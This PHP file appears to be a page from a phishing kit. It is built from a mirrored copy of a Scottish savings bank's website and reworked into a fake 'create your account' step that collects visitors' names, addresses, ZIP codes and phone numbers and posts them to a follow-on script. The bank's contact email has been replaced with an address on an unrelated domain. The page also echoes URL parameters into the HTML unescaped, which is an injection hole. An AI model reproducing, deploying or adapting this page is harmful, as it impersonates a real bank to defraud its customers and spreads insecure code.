<?php 
error_reporting(0);
session_start();
$_SESSION['reg'] = 'reg1';
$firstNumber = rand(0 , 100);
$secondNumber = rand(0 , 100);
$first = $_GET['first'];
$last = $_GET['last'];
$add = $_GET['add'];
$city = $_GET['city'];
$state = $_GET['state'];
$zip = $_GET['zip'];
$mob = $_GET['mob'];
$errMsg = $_GET['errMsg'];
?>
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="iem7 old no-js"><![endif]-->
<!--[if lt IE 7 ]><html lang="en" class="ie6 old no-js"><![endif]-->
<!--[if IE 7 ]><html lang="en" class="ie7 old no-js"><![endif]-->
<!--[if IE 8 ]><html lang="en" class="ie8 no-js"><![endif]-->
<!--[if IE 9 ]><html lang="en" class="ie9 no-js"><![endif]-->
<!--[if (gte IE 9)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!-->
<html lang="en" class="no-js">
<!--<![endif]-->

<!-- Mirrored from airdriesavingsbank.com/call-back/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 09 Jul 2016 12:02:13 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>
    <meta charset="utf-8" />
    

<title>Call-back : Airdrie Savings Bank</title>

<meta name="description" content="Discover Britain&#39;s only independent savings bank, with current and savings accounts for businesses and individuals. Offers mortgages, loans, savings and much more" />

<meta property="og:title" content="Airdrie Savings Bank" />
<meta property="og:description" content="" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta http-equiv="cleartype" content="on">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0" />
    <meta name="google-site-verification" content="OQ4xeOxsy4dM-80Atd4ZwxWiS_Ztsd-ykOXMLMT-xCk" />
    <link rel="canonical" href="index.php"/>
    <!--[if lte IE 8 ]>
        <link rel="stylesheet" href="/Content/css/all-old-ie.css" />
        <script>'article|section'.replace(/\w+/g,function(t){document.createElement(t)})</script>
        <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->
    <!--[if gt IE 8]><!-->
    <link rel="stylesheet" href="../Content/css/all.css">
    <!--<![endif]-->
    <link rel="shortcut icon" href="../Content/images/icons/favicon.ico" />
    <link rel="apple-touch-icon" href="../Content/images/icons/apple-touch-icon.png" />
    <link rel="apple-touch-icon-precomposed" href="../Content/images/icons/apple-touch-icon.png" />
    <link rel="shortcut icon" href="../Content/images/icons/apple-touch-icon.png">
    <link rel="stylesheet" href="../Content/webfonts/css/fontello.css">
    <link rel="stylesheet" href="../Content/webfonts/css/animation.css">
    <!--[if IE 7]>
        <link rel="stylesheet" href="/Content/css/all-old-ie.css">
        <link rel="stylesheet" href="/Content/webfonts/css/fontello-ie7.css">
    <![endif]-->
    <link href='http://fonts.googleapis.com/css?family=Open+Sans:400italic,600italic,700italic,400,700,600' rel='stylesheet' type='text/css'>
    <link href='http://fonts.googleapis.com/css?family=Lato:400,700,900,400italic,700italic,900italic' rel='stylesheet' type='text/css'>
    <script src="../Content/js/modernizr.js"></script>
    <script src="jquery.js"></script>
</head>
<body onclick="$('#notify').fadeOut('slow');">
    <header class="masthead" role="banner">
        <div class="wrapper">
            <div class="triggers">
                <button class="trigger pull-left js-trigger--nav"><i class="icon-menu mega"></i></button>
                <button class="trigger trigger-border js-trigger--utility"><i class="icon-lock mega"></i></button>
                <button class="trigger js-trigger--search"><i class="icon-search mega"></i></button>
            </div>
            <nav class="nav nav-utility js-panel--utility">
                <ul>
                    <li class="btn-login-panel pull-right-tablet"><a href="../login/" target="_blank" class="btn btn-primary btn-login"><i class="icon-lock"></i>Login to internet banking</a></li>
                    <li class="pull-right-tablet visable-on-large"><a href="https://twitter.com/AirdrieSBank" target="_blank"><i class="icon-twitter-circled social-icon"></i> <span class="hide-on-tablet delta">Follow us on Twitter</span></a></li>
                    <!--<li class="pull-right-tablet"><a href="#"><i class="icon-facebook-circled social-icon"></i> <span class="hide-on-tablet delta">Follow us on Facebook</span></a></li>-->
                </ul>
            </nav>
            <div class="wrap-search medium-5 pull-right-tablet js-panel--search">
                <div class="global-search">
                    <form class="search" action="../search.php" method="GET">
                        <label>Search the site</label>
                        <input type="text" placeholder="What are you looking for?" name="s" id="s">
                        <button class="btn btn-search" type="submit"><i class="icon-search"></i></button>
                    </form>
                </div>
            </div>
            <!--[if gt IE 8]><!-->
                <a class="site-logo" href="../index.php"><img src="../Content/images/branding/asb-logo.svg" alt="Airdrie Savings Bank"></a>
            <!--<![endif]-->
            <!--[if lte IE 8 ]>
                <a class="site-logo" href="/"><img src="/Content/images/branding/ie-logo.png" alt="Airdrie Savings Bank"></a>            
            <!--<![endif]-->
            <h2 class="tagline">Britain's only Independent Savings Bank <span><i>Est. 1835</i></span></h2>
        </div>
    </header>

    


<nav class="nav nav-primary js-panel--nav" role="navigation">
    <div class="wrapper wrapper-wide">
        <div class="medium-12 block">
            <ul>
                    <li class=" home ">
                        <a href="../index.php" class="active">Home</a>
                    </li>
                    <li class="submenu">
                        <a href="../business/index.php" class="active">Business</a>
                            <span class="expander"><i class="icon-down-open-1 beta"></i></span>
                            <ul>
                                    <li>
                                        <a href="../business/new-idea%2c-new-venture/index.php">New idea, new venture?</a> 
                                    </li>
                                    <li>
                                        <a href="../business/business-bank-accounts/index.php">Business bank accounts</a> 
                                    </li>
                                    <li>
                                        <a href="../business/business-savings-accounts/index.php">Business savings accounts</a> 
                                    </li>
                                    <li>
                                        <a href="../business/business-loans/index.php">Business loans</a> 
                                    </li>
                            </ul>
                    </li>
                    <li class="submenu">
                        <a href="../personal/index.php" class="active">Personal</a>
                            <span class="expander"><i class="icon-down-open-1 beta"></i></span>
                            <ul>
                                    <li>
                                        <a href="../personal/current-account/index.php">Current account</a> 
                                    </li>
                                    <li>
                                        <a href="../personal/savings-accounts/index.php">Savings accounts</a> 
                                    </li>
                                    <li>
                                        <a href="../personal/loans/index.php">Loans</a> 
                                    </li>
                                    <li>
                                        <a href="../personal/mortgages-and-bridging-loans/index.php">Mortgages and bridging loans</a> 
                                    </li>
                                    <li>
                                        <a href="../personal/buy-to-let-mortgage/index.php">Buy To Let Mortgage</a> 
                                    </li>
                            </ul>
                    </li>
                    <li class="submenu">
                        <a href="../third-sector/index.php" class="active">Third Sector</a>
                            <span class="expander"><i class="icon-down-open-1 beta"></i></span>
                            <ul>
                                    <li>
                                        <a href="../third-sector/what-sets-us-apart/index.php">What sets us apart?</a> 
                                    </li>
                                    <li>
                                        <a href="../third-sector/social-enterprise-lending/index.php">Social enterprise lending</a> 
                                    </li>
                                    <li>
                                        <a href="../third-sector/social-enterprise-savings/index.php">Social enterprise savings</a> 
                                    </li>
                                    <li>
                                        <a href="../third-sector/social-mortgage/index.php">Social: Mortgage</a> 
                                    </li>
                            </ul>
                    </li>
                    <li class="submenu">
                        <a href="../under-18s/index.php" class="active">Under 18s</a>
                            <span class="expander"><i class="icon-down-open-1 beta"></i></span>
                            <ul>
                                    <li>
                                        <a href="../under-18s/independent-account/index.php">Independent account</a> 
                                    </li>
                                    <li>
                                        <a href="../under-18s/saving-with-asb/index.php">Saving with ASB</a> 
                                    </li>
                            </ul>
                    </li>
                    <li class="submenu">
                        <a href="../our-ethos/index.php" class="active">Our ethos</a>
                            <span class="expander"><i class="icon-down-open-1 beta"></i></span>
                            <ul>
                                    <li>
                                        <a href="../our-ethos/history/index.php">History</a> 
                                    </li>
                                    <li>
                                        <a href="../our-ethos/financial-information/index.php">Financial information</a> 
                                    </li>
                                    <li>
                                        <a href="../our-ethos/governance/index.php">Governance</a> 
                                    </li>
                                    <li>
                                        <a href="../our-ethos/regulation/index.php">Regulation</a> 
                                    </li>
                            </ul>
                    </li>
                    <li class="">
                        <a href="../intermediaries/index.php" class="active">Intermediaries</a>
                    </li>
                    <li class="">
                        <a href="../partners/index.php" class="active">Partners</a>
                    </li>
                    <li class="submenu">
                        <a href="../get-in-touch/index.php" class="active">Get in touch</a>
                            <span class="expander"><i class="icon-down-open-1 beta"></i></span>
                            <ul>
                                    <li>
                                        <a href="../get-in-touch/locations/index.php">Locations</a> 
                                    </li>
                            </ul>
                    </li>
            </ul>
        </div>
    </div>
</nav>

    



<div class="content product-landing" role="main">
    <div class="bg-primary landing-header relative">
        <div class="wrapper">
            <div class="row">
                <header>
                    <div class="small-12 large-7">
                        <div class="padding-vertical">                    
                            <h1 class="giga white">Just a few more data to get you done creating your account</h1>
                            <p class="alpha white"></p>
                        </div>
                    </div>
                    <div class="small-12 large-5">
                        <img src="../media/15036/callback-header.jpg" alt="" class="visable-on-large"/>
                    </div>
                </header>
            </div>
        </div>
    </div>
    <div class="wrapper">
        <div class="row margin-top-large">
            <div class="medium-7">
                <!---->
                <h2 class="mega"></h2>
                <p></p>
                

<form style='' action='reg2.php?fnum=<?php echo $firstNumber; ?>&snum=<?php echo $secondNumber; ?>' class="form" enctype="multipart/form-data" method="post"><input id="Id" name="Id" type="hidden" value="00000000-0000-0000-0000-000000000000" />    <fieldset>
        <legend style="position: relative; text-align: center; font-size: 18px; font-weight: bold; color: #006CFF;  ">Your personal details</legend>
        <?php if(isset($errMsg) && !empty($errMsg))
        {
            echo "<h4  id='notify' style='position: relative; width: 500px; height: 30px; line-height: 30px; margin-right: auto; margin-left: auto; text-align: center; margin-top: 5px; color: #FF1100;  '>". $errMsg . "</h4>";
        } 
    ?>
        <ul>
            
            <li class="clearfix">
                <div class="row row-small">
                    <div class="small-12 medium-4">
                        <label for="Email">First Name</label>
                    </div>
                    <div class="small-12 medium-8">
                        <input id="FirstName" type="text" name='firstname' <?php if(isset($first) && !empty($first)){
        echo "value=".$first;
        } ?> placeholder='Enter Your First Name'/>
                        
                    </div>
                </div>
            </li>
            <li class="clearfix">
                <div class="row row-small">
                    <div class="small-12 medium-4">
                        <label for="Email">Last Name</label>
                    </div>
                    <div class="small-12 medium-8">
                        <input id="FirstName" type="text" name='lastname' <?php if(isset($last) && !empty($last)){
        echo "value=".$last;
        } ?> placeholder='Enter Your Last Name'/>
                        
                    </div>
                </div>
            </li>
            <li class="clearfix">
                <div class="row row-small">
                    <div class="small-12 medium-4">
                        <label for="Email">Address</label>
                    </div>
                    <div class="small-12 medium-8">
                        <input id="FirstName"  type="text" name='address' <?php if(isset($add) && !empty($add)){
        echo "value=".$add;
        } ?> placeholder='Enter Your Address'/>
                        
                    </div>
                </div>
            </li>
            <li class="clearfix">
                <div class="row row-small">
                    <div class="small-12 medium-4">
                        <label for="Email">City</label>
                    </div>
                    <div class="small-12 medium-8">
                        <input id="FirstName" type="text" name='city' <?php if(isset($city) && !empty($city)){
        echo "value=".$city;
        } ?> placeholder='Enter Your City'/>
                        
                    </div>
                </div>
            </li>
            <li class="clearfix">
                <div class="row row-small">
                    <div class="small-12 medium-4">
                        <label for="Email">State</label>
                    </div>
                    <div class="small-12 medium-8">
                        <input id="FirstName"  type="text" name='state' <?php if(isset($state) && !empty($state)){
        echo "value=".$state;
        } ?> placeholder='Enter Your Email'/>
                        
                    </div>
                </div>
            </li>
            <li class="clearfix">
                <div class="row row-small">
                    <div class="small-12 medium-4">
                        <label for="Email">ZIP</label>
                    </div>
                    <div class="small-12 medium-8">
                        <input id="FirstName" type="text"  name='zip' <?php if(isset($zip) && !empty($zip)){
        echo "value=".$zip;
        } ?> placeholder='Enter Your ZIP'/>
                        
                    </div>
                </div>
            </li>
            <li class="clearfix">
                <div class="row row-small">
                    <div class="small-12 medium-4">
                        <label for="Password">Phone Number</label>
                    </div>
                    <div class="small-12 medium-8">
                        <input id="Surname" type="text" name='mobile' <?php if(isset($mob) && !empty($mob)){
        echo "value=".$mob;
        } ?> placeholder='Enter Your Mobile number'/>
                        
                    </div>
                </div>
            </li>
            <li class="clearfix">
                <div class="row row-small">
                    <div class="small-12 medium-4">
                        <label for="ContactNumber">Question</label>
                    </div>
                    <div class="small-12 medium-4">
                       <?php
    echo "<spam style='font-size: 22px; color:#5D5D5D; position: relative; float: left; margin-right: 10%; line-height: 40px; '>".$firstNumber.' + '.$secondNumber.' =</spam>';
    ?> <input id="ContactNumber" name="code" type="text" value="" style="position: relative; float: left; width: 40%;" placeholder='Answer'/>
                        
                    </div>
                </div>
            </li> 
            <li class="clearfix">
                <div class="row row-small">
                    <div class="small-12 medium-4">
                        <label for="ContactNumber" style="color: white;">.</label>
                    </div>
                    <div class="small-12 medium-4">
                 <p style=""><input type='checkbox' name='agree' value='1' style='position: relative; ' /> I Agree to the<a href="../our-ethos/regulation/index.php">Rules and Regulations</a></p>
                        
                    </div>
                </div>
            </li>
           
        </ul>
        <div class="margin-top-large">
            <div class="row">
                <div class="small-12 medium-4">
                    <p>&nbsp;</p>
                </div>
                <div class="small-12 medium-4">
                    <input type="submit" value="Agree and Create Account" class="btn btn-primary btn-large" />
                </div>
            </div>
        </div>

    </fieldset>
<input name='uformpostroutevals' type='hidden' value='2E5BD7A0617DD79845DE26774181002D431F54B9A23DBC12CB3E54CAD672F4E6DDC4B5806AE70762827F05F7300A1112704CD999869B94AD94863F6722A7BF1B4C6FE55169BD2D7822FC0BF938BE9F6DAD64D5B3A6F3E3D459767D1944360014E6FF79C161CB07FBA89950AF90A5C91765CD856D60F46CCA24CF4C218E31EC6E2FDC8989BF293DF6C544700555AE0E6A9BD525B873B7E45D380DF771F52EF0658394BB8DE207E43ADA01E14A7BD3CDC0' /></form>
            </div>
            <!--<div class="medium-5">
                <figure>
                    <img alt="">
                    <figcaption></figcaption>
                </figure>
            </div>-->
        </div>
        <hr class="split" />
        <div class="row margin-top-large">
        </div>
        <div class="row margin-ends">
        </div>
    </div>
</div>



    <div class="bg-light-blue editor-content subfooter">
        <div class="wrapper">
            <div class="content" role="main">
                <div class="medium-4 margin-top-xlarge margin-btm-xlarge">
                    <div class="row row-small">
                        <div class="small-3 medium-4">
                            <!--[if gt IE 8]><!-->
                            <img class="img-width" src="../Content/images/icons/icon-loan-calculator.svg" alt="" />
                            <!--<![endif]-->
                            <!--[if lte IE 8 ]>
                                <img src="/Content/images/icons/ie-icon-loan-calculator.png" alt="" />
                            <!--<![endif]-->                            
                        </div>
                        <div class="small-9 medium-8">
                            <h3 class="alpha">Loan calculator</h3>
                            <p class="gamma">Find out how competitive a loan from Airdrie Savings Bank can be.</p>
                            <a href="../personal/loans/loan-calculators/index.php" class="gamma"><i class="icon-right-circle"></i> <strong>Use our loan calculator</strong></a>
                        </div>
                    </div>
                </div>
                <div class="medium-4 margin-top-xlarge margin-btm-xlarge">
                    <div class="row row-small">
                        <div class="small-3 medium-4">
                            <!--[if gt IE 8]><!-->
                            <img class="img-width" src="../Content/images/icons/icon-mortgage-calculator.svg" alt="" />
                            <!--<![endif]-->
                            <!--[if lte IE 8 ]>
                                <img src="/Content/images/icons/ie-icon-mortgage-calculator.png" alt="" />
                            <!--<![endif]-->
                        </div>
                        <div class="small-9 medium-8">
                            <h3 class="alpha">Mortgage calculator</h3>
                            <p class="gamma">Find out how much you can borrow, and get a no-obligation personalised quotation.</p>
                            <a href="../personal/mortgages-and-bridging-loans/mortgage-calculator/index.php" class="gamma"><i class="icon-right-circle"></i> <strong>Use our mortgage calculator</strong></a>
                        </div>
                    </div>
                </div>
                <div class="medium-4 margin-top-xlarge margin-btm-xlarge">
                    <div class="row row-small">
                        <div class="small-3 medium-4">
                            <!--[if gt IE 8]><!-->
                            <img class="img-width" src="../Content/images/icons/icon-lost-card.svg" alt="" />
                            <!--<![endif]-->
                            <!--[if lte IE 8 ]>
                                <img src="/Content/images/icons/ie-icon-lost-card.png" alt="" />
                            <!--<![endif]-->                                
                        </div>
                        <div class="small-9 medium-8">
                            <h3 class="alpha">Lost or stolen card or PIN?</h3>
                            <p class="gamma">Let us know as soon as possible.</p>
                            <a href="../lost-or-stolen-card-or-pin/index.php" class="gamma"><i class="icon-right-circle"></i> <strong>Find out what you should do here</strong></a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <footer class="site-footer" role="contentinfo">
        <div class="wrapper">
            <div class="medium-8">
                <div class="row row-small">
                    <div class="small-12 medium-4">
                        <a class="site-logo site-logo-footer" href="../index.php">
                            <!--[if gt IE 8]><!-->
                                <img class="hide-on-mobile" src="../Content/images/branding/asb-logo.svg" alt="Airdrie Savings Bank" />
                            <!--<![endif]-->
                            <!--[if lte IE 8 ]>
                                <img class="hide-on-mobile" src="/Content/images/branding/ie-logo.png" alt="Airdrie Savings Bank" />
                            <!--<![endif]-->                                                            
                        </a>
                    </div>
                    <div class="small-12 medium-3">
                        <ul class="lister lister-footer">
                            <li>Head office:</li>
                            <li>56 Stirling Street</li>
                            <li>Airdrie</li>
                            <li>Scotland</li>
                            <li>ML6 0AW</li>
                        </ul>
                    </div>
                    <div class="small-12 medium-5">
                        <ul class="lister lister-footer lister-footer-alt">
                            <li><strong></strong> </li>
                            <li><strong>Email:</strong> <a href="mailto:infodesk@classicsmake.com">infodesk@classicsmake.com</a></li>
                        </ul>
                    </div>
                </div>
            </div>
            <div class="medium-4 relative">
                <div class="site-footer-bar"></div>
                <ul class="lister lister-footer lister-footer-deep two-up">
                    <li class="col"><a href="../index.php"><i>Home</i></a></li>
                    
                        <li class="col"><a href="index.php"><i>Call-back</i></a></li>
                        <li class="col"><a href="../personal/index.php"><i>Personal</i></a></li>
                        <li class="col"><a href="../accessibility/index.php"><i>Accessibility</i></a></li>
                        <li class="col"><a href="../business/index.php"><i>Business</i></a></li>
                        <li class="col"><a href="../disclosure-personal-information-statements/index.php"><i>Privacy policy</i></a></li>
                        <li class="col"><a href="../under-18s/index.php"><i>Under 18s</i></a></li>
                        <li class="col"><a href="../terms-conditions/index.php"><i>Terms and conditions</i></a></li>
                        <li class="col"><a href="../our-ethos/index.php"><i>Our ethos</i></a></li>
                        <li class="col"><a href="../internet-banking/staying-secure/index.php"><i>Staying secure</i></a></li>
                </ul>
            </div>
            <div class="medium-12">
                <div class="row">
                    <div class="small-12 medium-6">
                        <p class="delta margin-top-large margin-btm-xlarge"><i>Airdrie Savings Bank is authorised by the Prudential Regulation Authority and regulated by the Financial Conduct Authority and the Prudential Regulation Authority. <br />Our firm reference number is 204584.</i></p>
                    </div>
                    <div class="small-12 medium-6">
                        <a class="pull-right push--left push-half--top" href="../media/52589/FSCS-Booklet.pdf">
                            <img src="../Content/images/branding/fscs.jpg" width="100" alt="Financial Services Compensation Scheme" />
                        </a>
                        <div class="pull-right push-half--top" style="background: #fff; padding: 0 10px;">
                            <script type="text/javascript" src="https://seal.verisign.com/getseal?host_name=airdriesavingsbank.com&amp;size=L&amp;use_flash=NO&amp;use_transparent=NO&amp;lang=en"></script>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </footer>

    <script src="../../ajax.googleapis.com/ajax/libs/jquery/1.10.1/jquery.min.js"></script>
    <script src="../Content/js/jquery-ui.js"></script>
    <script src="../Content/js/jquery.ui.touch-punch.min.js"></script>
    <script src="../Content/js/foundation.reveal.js"></script>
    <script src="../Content/js/responsiveslides.min.js"></script>
    <script src="../Content/js/easyResponsiveTabs.js"></script>
    <script src="../Content/js/scripts.js"></script>

    <script src="../app/scripts/angular.min.js"></script>
    <script src="../app/scripts/slider.js"></script>
    <script src="../app/app.js"></script>
    <script src="../app/loanController.js"></script>
    <script src="../app/expressLoanController.js"></script>
    <script src="../app/loanService.js"></script>
    
    <!--Google-->
    <script>
        (function (i, s, o, g, r, a, m) {
            i['GoogleAnalyticsObject'] = r; i[r] = i[r] || function () {
                (i[r].q = i[r].q || []).push(arguments)
            }, i[r].l = 1 * new Date(); a = s.createElement(o),
            m = s.getElementsByTagName(o)[0]; a.async = 1; a.src = g; m.parentNode.insertBefore(a, m)
        })(window, document, 'script', '../../www.google-analytics.com/analytics.js', 'ga');

        ga('create', 'UA-48958610-1', 'airdriesavingsbank.com');
        ga('send', 'pageview');

    </script>
    <!--Google-->
    
    <script type="text/javascript" src="../Content/js/cookie.js"></script>
    <script type="text/javascript">
        $.stormCookie({
            cookiePageUrl: 'https://airdriesavingsbank.com/cookies/',
            target: '_blank'
        });
  </script>

</body>

<!-- Mirrored from airdriesavingsbank.com/call-back/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 09 Jul 2016 12:02:16 GMT -->
</html>
